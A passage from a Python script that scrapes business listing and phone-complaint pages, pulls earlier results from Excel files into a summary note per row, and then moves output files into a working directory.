                soup.find(text=re.compile(r"Internal Server Error"))
            soup.prettify()
            type(fivehundred) is str

        secondMatch = \
            soup.find(text=re.compile(r"We did not find any business"))
        soup.prettify()
        type(secondMatch) is str

        blocked(soup)

        if secondMatch is None:
            businessEntries(soup)
            businessName(soup)
            addressBus(street, locality, postal, soup)


    # My last addition. Full composition brief note taker.

    if website == 'A':
        if dragNDrop != '':
            nestedName = preName
        if(os.path.isfile(nestedName + "_rev_YellowPages.xlsx")):
            workman = xlrd.open_workbook(nestedName + "_rev_YellowPages.xlsx")
            workboy = workman.sheet_by_name('Sheet1')
            busName = workboy.cell(idx + 1, 6).value
            busAddy = workboy.cell(idx + 1, 7).value
        else:
            busName = ""
            busAddy = ""

        if(os.path.isfile(nestedName + "_rev_800notes.xlsx")):
            workman = xlrd.open_workbook(nestedName + "_rev_800notes.xlsx")
            workboy = workman.sheet_by_name('Sheet1')
            eightDate = workboy.cell(idx + 1, 9).value
            eightMessages = workboy.cell(idx + 1, 10).value
            eightMessages = str(eightMessages)[:-2]
            eightSentiment = workboy.cell(idx + 1, 7).value
        else:
            eightDate = "N/A"
            eightMessages = "0"
            eightSentiment = ""
        reviewNote = 'BN={0}; BA={1}; BW=; CB=; CT=; 8N={2} | {3} COMMENTS IN THE PAST YEAR; N/K={4};'.format(busName, busAddy, eightDate, eightMessages, eightSentiment)
        worksheet.write(idx + 1, 1, reviewNote)


# Close up Shop!

if website == '2' or website == '3' or website == '4' or website == '5':
    driver.close()

workbook.close()

# Determine if file was dragged or not for creation of Dirs.

if dragNDrop == '':
    if not os.path.exists('WorkingDir'):
        os.makedirs('WorkingDir')
    if not os.path.exists('WorkingDir/' + preName):
        os.makedirs('WorkingDir/' + preName)

# Was the file originially a CSV?

if prepRev == '.csv':
    totalName = preName + '.xlsx'
else:
    totalName = preName + prepRev

# If we haven't already moved all of the files, here we go.

if dragNDrop == '':
    copyfile(totalName, 'WorkingDir/' + preName + '/' + totalName)
    move(preName + siteType, 'WorkingDir/' + preName + '/' + preName
         + siteType)

# Delete the PYC

if os.path.isfile('Harvard.pyc'):
    os.remove('Harvard.pyc')

# End Animation.

done = True
print('\nDing! Job Done!')
